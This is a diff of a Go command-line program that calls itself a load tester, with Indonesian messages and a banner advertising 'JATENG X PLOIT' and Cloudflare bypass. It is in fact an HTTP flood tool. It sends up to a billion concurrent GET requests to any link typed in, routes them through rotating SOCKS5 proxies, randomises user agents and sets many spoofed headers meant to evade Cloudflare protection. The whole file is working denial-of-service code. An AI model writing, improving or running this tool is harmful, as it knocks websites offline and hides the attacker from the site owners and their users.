@@ -1,6 +1,7 @@
 package main
-
+ 
 import (
+	"bufio"
 	"context"
 	"encoding/json"
 	"flag"
@@ -19,18 +20,18 @@ import (
 	"syscall"
 	"time"
 	"golang.org/x/net/http2"
+	"github.com/corpix/uarand"
 )
 
 const (
-	RESET  = "\033[1;0m"
-	HIJAU  = "\033[1;92m"
-	MERAH  = "\033[1;91m"
-	KUNING = "\033[1;93m"
-	UNGU   = "\033[1;95m"
-	CYAN   = "\033[1;96m"
+	RESET  = "\033[1;0m"	 
+	HIJAU  = "\033[1;92m"	 
+	MERAH  = "\033[1;91m"	 
+	KUNING = "\033[1;93m"	 
+	UNGU   = "\033[1;95m"	 
+	CYAN   = "\033[1;96m"	 
 )
-
-func Putih(text string) string { return "\033[1;97m" + text + RESET }
+func Putih(text string) string  { return "\033[1;97m" + text + RESET }
 func Hijau(text string) string  { return HIJAU + text + RESET }
 func Merah(text string) string  { return MERAH + text + RESET }
 func Kuning(text string) string { return KUNING + text + RESET }
@@ -38,92 +39,110 @@ func Ungu(text string) string   { return UNGU + text + RESET }
 func Cyan(text string) string   { return CYAN + text + RESET }
 
 type LoadTester struct {
-	Link             string
-	numRequests      int64
-	concurrency      int
-	timeout          time.Duration
-	method           string
-	headers          map[string]string
-	proxies          []string
-	successCount     int64
-	failureCount     int64
-	sentCount        int64
-	totalLatency     int64
-	lastResponseCode string
-	client           *http.Client
+	Link             string	 
+	numRequests      int64	 
+	concurrency      int	 
+	timeout          time.Duration	 
+	method           string	 
+	headers          map[string]string	 
+	proxies          []string	 
+	successCount     int64	 
+	failureCount     int64	 
+	sentCount        int64	 
+	totalLatency     int64	 
+	lastResponseCode string	 
+	client           *http.Client	 
 }
-
-func NewLoadTester(Link string, numRequests int64, concurrency int, timeout time.Duration, method string, headers map[string]string, proxies []string) *LoadTester {
-	var proxyFunc func(*http.Request) (*url.URL, error)
-	if len(proxies) > 0 {
-		proxyFunc = func(req *http.Request) (*url.URL, error) {
-			proxyStr := proxies[rand.Intn(len(proxies))]
-			return url.Parse(proxyStr)
-		}
+ 
+func NewLoadTester(  
+	Link string, 	 
+	numRequests int64, 	
+	concurrency int,   
+	timeout time.Duration, 	  
+	method string, 	 
+	headers map[string]string, 	 
+	proxies []string, 
+	 
+) *LoadTester {   
+	var proxyFunc func(*http.Request) (*url.URL, error) 	 	 
+	if len(proxies) > 0 { 	 	
+		proxyFunc = func(req *http.Request) (*url.URL, error) { 				
+			proxyStr := proxies[rand.Intn(len(proxies))]						
+			return url.Parse(proxyStr)						
+		}		
 	}
+	 
 	transport := &http.Transport{
 		Proxy:               proxyFunc,
 		MaxIdleConns:        50000,
 		MaxIdleConnsPerHost: 50000,
-		IdleConnTimeout:     2 * time.Second,
-		TLSHandshakeTimeout: 2 * time.Second,
+		IdleConnTimeout:     3 * time.Second,
+		TLSHandshakeTimeout: 3 * time.Second,
 		DialContext: (&net.Dialer{
-			Timeout:   2 * time.Second,
-			KeepAlive: 2 * time.Second,
-			DualStack: true,
-		}).DialContext,
+			Timeout:   3 * time.Second,
+			KeepAlive: 3 * time.Second,		
+			DualStack: true,	
+		}).DialContext,	
 	}
+	
 	if err := http2.ConfigureTransport(transport); err != nil {
-		log.Fatalf("Gagal mengonfigurasi HTTP/2: %v", err)
+		log.Fatalf("Gagal mengonfigurasi HTTP/2: %v", err)	
 	}
-	client := &http.Client{
-		Transport: transport,
+	client := &http.Client{	
+		Transport: transport,	
 		Timeout:   timeout,
 	}
+	
 	return &LoadTester{
-		Link:        Link,
-		numRequests: numRequests,
-		concurrency: concurrency,
-		timeout:     timeout,
-		method:      method,
-		headers:     headers,
-		proxies:     proxies,
-		client:      client,
+		Link:         Link,	
+		numRequests:  numRequests,	
+		concurrency:  concurrency,
+		timeout:      timeout,	
+		method:       method,
+		headers:      headers,
+		proxies:      proxies,
+		client:       client,		
 	}
 }
 
 func (lt *LoadTester) sendRequest(ctx context.Context) {
-	startTime := time.Now()
+	startCycle := time.Now()
 	req, err := http.NewRequestWithContext(ctx, lt.method, lt.Link, nil)
 	if err != nil {
-		atomic.AddInt64(&lt.failureCount, 1)
-		lt.lastResponseCode = "ERROR"
-		return
+		atomic.AddInt64(&lt.failureCount, 1)		
+		lt.lastResponseCode = "ERROR"				
+		return		
+	}	
+	req.Header.Set("User-Agent", uarand.GetRandom())	
+	for k, v := range lt.headers {		
+		if strings.ToLower(k) == "user-agent" {				
+			continue						
+		}				
+		req.Header.Set(k, v)				
+	}	
+	
+	resp, err := lt.client.Do(req)		
+	lat := time.Since(startCycle)		
+	atomic.AddInt64(&lt.totalLatency, lat.Nanoseconds())		
+	if err != nil {		
+		atomic.AddInt64(&lt.failureCount, 1)				
+		lt.lastResponseCode = "ERROR"				
+		return				
 	}
-	for k, v := range lt.headers {
-		req.Header.Set(k, v)
-	}
-	resp, err := lt.client.Do(req)
-	latency := time.Since(startTime)
-	atomic.AddInt64(&lt.totalLatency, latency.Nanoseconds())
-	if err != nil {
-		atomic.AddInt64(&lt.failureCount, 1)
-		lt.lastResponseCode = "ERROR"
-		return
-	}
-	defer resp.Body.Close()
-	lt.lastResponseCode = fmt.Sprintf("%d", resp.StatusCode)
-	if resp.StatusCode == 200 {
-		atomic.AddInt64(&lt.successCount, 1)
+		
+	defer resp.Body.Close()		
+	lt.lastResponseCode = fmt.Sprintf("%d", resp.StatusCode)		
+	if resp.StatusCode == 200 {		
+		atomic.AddInt64(&lt.successCount, 1)				
 	} else {
-		atomic.AddInt64(&lt.failureCount, 1)
-	}
+		atomic.AddInt64(&lt.failureCount, 1)				
+	}		
 }
 
 func (lt *LoadTester) run(ctx context.Context, wg *sync.WaitGroup) {
 	defer wg.Done()
 	sem := make(chan struct{}, lt.concurrency)
-	var innerWg sync.WaitGroup
+	var inner sync.WaitGroup
 	for i := int64(0); i < lt.numRequests; i++ {
 		select {
 		case <-ctx.Done():
@@ -131,59 +150,36 @@ func (lt *LoadTester) run(ctx context.Context, wg *sync.WaitGroup) {
 		default:
 		}
 		sem <- struct{}{}
-		innerWg.Add(1)
+		inner.Add(1)
 		atomic.AddInt64(&lt.sentCount, 1)
 		go func() {
-			defer func() {
-				<-sem
-				innerWg.Done()
-			}()
+			defer func() { <-sem; inner.Done() }()
 			lt.sendRequest(ctx)
 		}()
 	}
-	innerWg.Wait()
+	inner.Wait()
 }
 
 func printLogo() {
 	logo := "" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣄⡀\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣷⡀\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⡿⠃\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⠿⠿⠿⠟⠋\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣶⣿⣿⣶⣄\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣷\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣶⣶⣤⡀\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠘⢿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠈⠻⣿⣿⣿⣿⣆⠀⠀⠀⢀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⣀⣤⣶⣶⣌⠻⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⠁⣰⣿⣿⣿⣿⣿⣦⣙⢿⣿⣿⣿⠄⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣦⣹⣟⣫⣼⣿⣿⣶⣿⣿⣿⣿⣿⣿⣯⡉⠉⠉⠁\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⡆⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⢻⣿⣿⣿⣿⣿⡇⠀⠀⠈⠉⠉⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉\n" +
-		"⠀⣠⣴⣶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⡇⠀⠸⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠹⢿⣿⣿⢿⣿⣿⣿⡿\n" +
-		"⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢰⣶⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣧⣄⣐⣀⣀⣀⣀⣀⡀\n" +
-		"⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
-		"⠀⠀⠉⠉⠙⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠁⠛⠛⠛⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁\n" +
-		"┌──────                   ┌──────\n" +
-		"  DIZ FLYZE PRIVATE         FAST SEND REQUESTS\n" +
-		"  JATENG X PLOIT V5         6 BYPAS CLOUDFLARE\n" +
-		"              ──────┘                    ──────┘\n"
+		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠\n" +
+		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧\n" +
+		"⠀⠀⠀⠀⠀⠀⠈⠀⠄⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
+		"⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈\n" +
+		"⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿⠐\n" +
+		"⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠂⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇\n" +
+		"⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿\n" +
+		"⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠐⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟\n" +
+		"⠙⢹⣿⣿⣿⠿⠋⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁\n" +
+		"⠀⠀⠉⠁															 \n"
 	fmt.Println(logo)
 }
 
-func animate(ctx context.Context, lt *LoadTester, initialCycleDuration, summaryDuration, updateInterval time.Duration) {
-	symbols := []string{"▁", "▃", "▄", "▅", "▇"}
-	symbolIndex := 0
-	currentCycleDuration := initialCycleDuration
+func animate(ctx context.Context, lt *LoadTester, currentCycleDuration time.Duration, summaryDuration time.Duration, interval time.Duration) {
+	syms := []string{"▁", "▃", "▄", "▅", "▇"}
+	idx := 0
 	startCycle := time.Now()
-	ticker := time.NewTicker(updateInterval)
+	ticker := time.NewTicker(interval)
 	defer ticker.Stop()
 	for {
 		select {
@@ -191,28 +187,26 @@ func animate(ctx context.Context, lt *LoadTester, initialCycleDuration, summaryD
 			return
 		case <-ticker.C:
 			elapsed := time.Since(startCycle)
-			pending := atomic.LoadInt64(&lt.sentCount) - (atomic.LoadInt64(&lt.successCount) + atomic.LoadInt64(&lt.failureCount))
 			done := atomic.LoadInt64(&lt.successCount) + atomic.LoadInt64(&lt.failureCount)
-			var avgLatency int64
+			pending := atomic.LoadInt64(&lt.sentCount) - done
+			avgLatency := int64(0)
 			if done > 0 {
 				avgLatency = atomic.LoadInt64(&lt.totalLatency) / done / 1e6
 			}
 			if elapsed >= currentCycleDuration {
 				total := done
-				summary := fmt.Sprintf("%s %s %s %s %s %s %s %s %s %s %s %s %s %s",
-					    Putih("\n "),
+				summary := fmt.Sprintf("%s %s %s %s %s %s %s %s %s %s %s %s",
+				        Putih("\n "),
  					   Cyan("["),
-					    Putih("DONE"),
+					    Putih("SU"),
 					    Cyan("]"),
-  					  Hijau(":"),
                         Cyan("["),
-   					 Putih(fmt.Sprintf("%d", int(currentCycleDuration.Seconds()))),
- 					   Putih("DETIK"),
+                        Putih(fmt.Sprintf("%d", int(currentCycleDuration.Seconds()))),
+                        Putih("DE"),
                         Cyan("]"),
-   					 Hijau(":"),
                         Cyan("["),
   					  Hijau(fmt.Sprintf("%d", total)),
-                        Putih("REQUESTS"),
+                        Putih("RE"),
                         Cyan("]"),
 		    	)
 				fmt.Println(summary)
@@ -223,156 +217,187 @@ func animate(ctx context.Context, lt *LoadTester, initialCycleDuration, summaryD
 			} else {
 				remaining := currentCycleDuration - elapsed
 				timerStr := fmt.Sprintf("%02d:%02d", int(remaining.Minutes()), int(remaining.Seconds())%60)
-				line := fmt.Sprintf("%s %s %s %s %s %s %s %s %s %s %s %s %s %s",
-			    	Cyan(symbols[symbolIndex%len(symbols)]),
+				line := fmt.Sprintf("%s %s %s %s %s %s %s %s %s %s %s",
+			    	Cyan(syms[idx%len(syms)]),
 			    	Merah("["),
-					Putih("OTW"),
+					Putih("TA"),
 					Merah("]"),
-					Kuning(":"),
 					Merah("["),
                     Hijau(timerStr),
 					Merah("]"),
-					Putih("RPS"),
-					Kuning(":"),
+					Putih("R"),
 					Hijau(fmt.Sprintf("%d", pending)),
-					Putih("AVG"),
-					Kuning(":"),
+					Putih("A"),
                     Hijau(fmt.Sprintf("%d", avgLatency)),
 				)
-				symbolIndex++
+				idx++
 				fmt.Print("\r" + line)
 			}
 		}
 	}
 }
 
-func loadConfig(configPath string) (map[string]interface{}, error) {
-	data, err := ioutil.ReadFile(configPath)
+func loadProxiesFromFile(path string) []string {
+	var proxies []string
+	file, err := os.Open(path)
 	if err != nil {
-		return nil, err
+		log.Fatalf("Gagal membuka file proxy.txt: %v", err)
 	}
-	var config map[string]interface{}
-	if err := json.Unmarshal(data, &config); err != nil {
-		return nil, err
+	defer file.Close()
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		line := strings.TrimSpace(scanner.Text())
+		if line != "" {
+			if !strings.Contains(line, "://") {
+				line = "socks5://" + line
+			}
+			proxies = append(proxies, line)
+		}
 	}
-	return config, nil
+	if err := scanner.Err(); err != nil {
+		log.Fatalf("Gagal membaca file proxy.txt: %v", err)
+	}
+	rand.Shuffle(len(proxies), func(i, j int) { proxies[i], proxies[j] = proxies[j], proxies[i] })
+	return proxies
 }
 
-func getIP(Link string) string {
-	parsed, err := url.Parse(Link)
-	if err != nil {
-		return "Unknown"
+func fetchProxies(urls []string) []string {
+	var out []string
+	client := &http.Client{Timeout: 3 * time.Second}
+	for _, src := range urls {
+		resp, err := client.Get(src)
+		if err != nil {
+			continue
+		}
+		scanner := bufio.NewScanner(resp.Body)
+		for scanner.Scan() {
+			line := strings.TrimSpace(scanner.Text())
+			if line == "" || strings.HasPrefix(line, "#") {
+				continue
+			}
+			if !strings.Contains(line, "://") {
+				line = "socks5://" + line
+			}
+			out = append(out, line)
+		}
+		resp.Body.Close()
 	}
-	host := parsed.Hostname()
-	addrs, err := net.LookupHost(host)
-	if err != nil || len(addrs) == 0 {
-		return "Unknown"
-	}
-	return addrs[0]
+	rand.Shuffle(len(out), func(i, j int) { out[i], out[j] = out[j], out[i] })
+	return out
 }
 
 func main() {
 	rand.Seed(time.Now().UnixNano())
+
 	configPath := flag.String("config", "", "FILE JSON")
-	urlFlag := flag.String("url", "", "LINK URL")
-	requestsFlag := flag.Int64("requests", 1000000000, "TOTAL REQUESTS")
-	concurrencyFlag := flag.Int("concurrency", 550, "CONCURRENCY")
-	timeoutFlag := flag.Float64("timeout", 2, "WAKTU SETIAP REQUEST (detik)")
-	methodFlag := flag.String("method", "GET", "HTTP METHOD (GET/POST/ETC)")
-	logFlag := flag.String("log", "ERROR", "DEBUG, INFO, WARNING, ERROR")
-	noLiveFlag := flag.Bool("no-live", false, "MATIKAN LIVE OUTPUT")
-	proxyFile := flag.String("proxy", "", "FILE PROXY")
-	updateIntervalFlag := flag.Float64("update-interval", 0.10, "KECEPATAN LOADING")
+	requestsFlag := flag.Int64("requests", 1000000000, "Total requests")
+	concurrencyFlag := flag.Int("concurrency", 750, "Concurrency")
+	timeoutFlag := flag.Float64("timeout", 2, "Timeout per request (detik)")
+
+	noLive := flag.Bool("no-live", false, "Matikan live output")
 	flag.Parse()
-	if strings.ToUpper(*logFlag) == "DEBUG" {
-		log.SetOutput(os.Stdout)
-	} else {
-		log.SetOutput(os.Stderr)
-	}
-	configData := make(map[string]interface{})
+
+	var cfg map[string]interface{}
 	if *configPath != "" {
-		conf, err := loadConfig(*configPath)
-		if err != nil {
-			fmt.Printf("ERROR: %v\n", err)
-			os.Exit(1)
-		}
-		configData = conf
+		b, _ := ioutil.ReadFile(*configPath)
+		json.Unmarshal(b, &cfg)
 	}
-	Link := *urlFlag
-	if Link == "" {
-		if val, ok := configData["url"].(string); ok {
-			Link = val
-		}
-	}
-	if Link == "" {
-		fmt.Println("JALANKAN GO RUN UNTUK MENGUNAKAN")
-		os.Exit(1)
-	}
-	numRequests := *requestsFlag
-	if val, ok := configData["requests"].(float64); ok {
-		numRequests = int64(val)
-	}
-	concurrency := *concurrencyFlag
-	if val, ok := configData["concurrency"].(float64); ok {
-		concurrency = int(val)
-	}
-	timeoutSec := *timeoutFlag
-	if val, ok := configData["timeout"].(float64); ok {
-		timeoutSec = val
-	}
-	method := strings.ToUpper(*methodFlag)
-	headers := map[string]string{
-		"User-Agent":           "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-		"Accept":               "application/json",
-		"Accept-Encoding":      "gzip, deflate, br",
-		"x-forwarded-proto":    "https",
-		"cache-control":        "no-cache",
-		"sec-ch-ua":            "\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
-		"sec-ch-ua-mobile":     "?0",
-		"sec-ch-ua-platform":   "Windows",
-		"accept-language":      "en-US,en;q=0.9",
-		"upgrade-insecure-requests": "1",
-	}
+
 	var proxies []string
-	if *proxyFile != "" {
-		data, err := ioutil.ReadFile(*proxyFile)
-		if err != nil {
-			fmt.Printf("ERROR: %v\n", err)
-			os.Exit(1)
-		}
-		lines := strings.Split(string(data), "\n")
-		for _, line := range lines {
-			trimmed := strings.TrimSpace(line)
-			if trimmed != "" {
-				proxies = append(proxies, trimmed)
-			}
-		}
+	proxies = loadProxiesFromFile("proxy.txt")
+
+reader := bufio.NewReader(os.Stdin)
+fmt.Print("+--[ LINK ] : ")
+link, _ := reader.ReadString('\n')
+link = strings.TrimSpace(link)
+
+if link == "" {
+    fmt.Println(Merah("LINK TIDAK BOLEH KOSONG"))
+    os.Exit(1)
+}
+
+	numReq := *requestsFlag
+	if v, ok := cfg["requests"].(float64); ok {
+		numReq = int64(v)
 	}
+	conc := *concurrencyFlag
+	if v, ok := cfg["concurrency"].(float64); ok {
+		conc = int(v)
+	}
+	timeout := time.Duration(*timeoutFlag * float64(time.Second))
+
+	headers := map[string]string{
+		"Accept":                    "application/json, text/html, application/xhtml+xml, application/xml;q=0.9, image/avif, image/webp, image/apng, */*;q=0.8, application/signed-exchange;v=b3;q=0.9",
+		"Accept-Encoding":           "gzip, deflate, br",
+		"x-forwarded-proto":         "https",
+		"x-requested-with":          "XMLHttpRequest",
+		"cache-control":             "no-cache",
+		"sec-ch-ua":                 "\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
+		"sec-ch-ua-mobile":          "?0",
+		"sec-ch-ua-platform":        "Windows",
+		"accept-language":           "en-US,en;q=0.9, fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5, en-US,en;q=0.5",
+		"upgrade-insecure-requests": "1",
+		"Connection":                "Keep-Alive",
+		"Max-Forwards":              "10",
+		"CF-RAY":                    "null",
+		"referer":                   "https://google.com",
+		"sec-fetch-mode":            "navigate, cors",
+		"sec-fetch-dest":            "empty",
+		"sec-fetch-site":            "same-origin",
+		"Access-Control-Request-Method": "GET",
+		"data-return": "false",
+		"dnt": "1",
+		"A-IM": "Feed",
+		"Delta-Base": "12340001",
+		"te": "trailers",
+		"method": "GET",
+		"pragma": "no-cache",
+		"sec-fetch-user": "?1",
+		"Accept-Language":          "en-US,en;q=0.9,id;q=0.8",
+		"CF-IPCountry":             "US",
+		"Via":                      "1.1 google",
+		"Origin":                   "https://www.google.com",
+		"Access-Control-Allow-Origin": "*",
+		"Device-Memory":            "8",
+		"Downlink":                 "10",
+		"ECT":                      "4g",
+		"RTT":                      "50",
+		"Save-Data":                "on",
+		"Viewport-Width":           "1920",
+		"Width":                    "1920",
+		"X-ATT-DeviceId":           "GT-N7100",
+		"X-Wap-Profile":            "http://wap.samsungmobile.com/uaprof/GT-N7100.xml",
+		"X-UIDH":                   "1234567890abcdef",
+		"X-Csrf-Token":             "null",
+		"X-Api-Version":            "1",
+		"X-Client-Data":            "CI22yQEIo7bJAQjEtskBCKmdygEIqKPKAQ==",
+	}
+
 	fmt.Print("\033[H\033[2J")
-	printLogo()
-	lt := NewLoadTester(Link, numRequests, concurrency, time.Duration(timeoutSec*float64(time.Second)), method, headers, proxies)
+    printLogo()
+
+	lt := NewLoadTester(link, numReq, conc, timeout, "GET", headers, proxies)
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
-	sigChan := make(chan os.Signal, 1)
-	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
+
+	sigc := make(chan os.Signal, 1)
+	signal.Notify(sigc, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
-		sig := <-sigChan
-		fmt.Printf("\n%sDATA: %v. OFF TASK%s\n", Merah(""), sig, RESET)
+		<-sigc
+		fmt.Printf("\n%sTERIMA SIG. STOP%s\n", Merah(""), RESET)
 		cancel()
 	}()
-	var animWg sync.WaitGroup
-	if !*noLiveFlag {
-		animWg.Add(1)
-		go func() {
-			defer animWg.Done()
-			animate(ctx, lt, 60*time.Second, 2*time.Second, time.Duration(*updateIntervalFlag*float64(time.Second)))
-		}()
-	}
+
 	var wg sync.WaitGroup
+	if !*noLive {
+		wg.Add(1)
+		go func() { defer wg.Done(); animate(ctx, lt, 60*time.Second, 2*time.Second, 100*time.Millisecond) }()
+	}
+
 	wg.Add(1)
 	go lt.run(ctx, &wg)
+
 	wg.Wait()
 	cancel()
-	animWg.Wait()
 	fmt.Println("\n" + Hijau(">> SUKSES <<"))
 }
